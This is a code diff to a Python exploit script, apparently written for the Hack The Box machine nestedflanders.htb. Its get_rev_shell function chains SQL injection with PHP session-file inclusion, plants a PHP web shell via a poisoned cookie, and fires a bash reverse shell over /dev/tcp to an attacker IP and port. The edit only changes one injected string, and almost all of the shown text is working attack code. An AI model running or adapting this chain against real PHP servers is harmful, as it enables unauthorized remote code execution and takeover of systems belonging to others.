@@ -48,7 +48,7 @@ def get_rev_shell(full_target,session, attacker_ip, attacker_port):
 	cookies = { "PHPSESSID": session }
 	res = requests.get(url, headers=headers, cookies=cookies, verify=False)
 	# Call once the injected session file
-	url = "https://%s/index.php?id=465%%27+and+1=2+UNION+SELECT+%%27about1%%5C%%27+UNION+SELECT+%%5C%%27/var/lib/php/sessions/sess_%s%%27--+-" % (full_target, session)
+	url = "https://%s/index.php?id=465%%27+and+1=2+UNION+SELECT+%%27about%%5C%%27+UNION+SELECT+%%5C%%27/var/lib/php/sessions/sess_%s%%27--+-" % (full_target, session)
 	headers = {"Host": "www.nestedflanders.htb", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Connection": "close", "Sec-Ch-Ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Language": "en-US,en;q=0.9"}
 	php_rce = "<%3fphp+system($_REQUEST['cmd'])%3b+%3f>"
 	cookies = {"PHPSESSID": session, "RCE": php_rce}
@@ -56,7 +56,7 @@ def get_rev_shell(full_target,session, attacker_ip, attacker_port):
 	res = requests.get(url, headers=headers, cookies=cookies, verify=False)
 	# Build reverse shell command to be executed an call it.
 	payload = "bash+-c+'bash+-i+>%%26+/dev/tcp/%s/%s+0>%%261'" % (attacker_ip, attacker_port)
-	url = "https://%s/index.php?cmd=%s&id=465%%27+and+1=2+UNION+SELECT+%%27about1\\%%27+UNION+SELECT+\\%%27/var/lib/php/sessions/sess_%s%%27--+-" % (full_target, payload, session)
+	url = "https://%s/index.php?cmd=%s&id=465%%27+and+1=2+UNION+SELECT+%%27about\\%%27+UNION+SELECT+\\%%27/var/lib/php/sessions/sess_%s%%27--+-" % (full_target, payload, session)
 	cookies = {"PHPSESSID": session, "rce": "<%3fphp+system($_REQUEST['cmd'])%3b+%3f>"}
 	headers = {"Host": "www.nestedflanders.htb", "Sec-Ch-Ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
 	print("[+] Attempting to perform RCE once the session cookie file has been injected with php code...")
